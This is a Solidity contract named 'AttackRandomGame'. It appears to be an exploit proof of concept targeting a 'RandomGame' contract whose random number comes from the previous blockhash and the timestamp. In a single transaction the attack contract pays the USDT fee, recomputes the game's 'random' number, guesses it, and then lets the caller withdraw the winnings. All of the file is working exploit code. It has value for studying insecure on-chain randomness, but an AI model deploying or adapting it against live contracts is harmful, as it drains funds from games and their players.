// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./RandomGame.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackRandomGame {
    RandomGame public randomGame;
    IERC20 public usdtToken;
    uint256 public constant MIN_NUMBER = 3;
    uint256 public constant MAX_NUMBER = 18;

    constructor(address gameAddress, address usdtAddress) {
        randomGame = RandomGame(gameAddress);
        usdtToken = IERC20(usdtAddress);
    }

    function attack() public {
        // The attacker must have approved this contract to spend the amount beforehand.
        usdtToken.transferFrom(
            msg.sender,
            address(this),
            randomGame.PLAY_FEE()
        );

        // Predict the number as before
        // uint256 blockHash = uint256(blockhash(blockNumber));
        uint256 blockHash = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );
        uint256 prediction = (blockHash % (MAX_NUMBER - MIN_NUMBER + 1)) +
            MIN_NUMBER;

        // Before making the guess, approve the RandomGame contract to use the USDT
        usdtToken.approve(address(randomGame), randomGame.PLAY_FEE());

        // Make the guess by calling the guess function on the RandomGame contract
        randomGame.guess(prediction);
    }

    function withdraw() public {
        uint256 balance = usdtToken.balanceOf(address(this));
        require(balance > 0, "Insufficient balance to withdraw.");

        // Transfer the USDT balance back to the attacker (msg.sender).
        usdtToken.transfer(msg.sender, balance);
    }
}
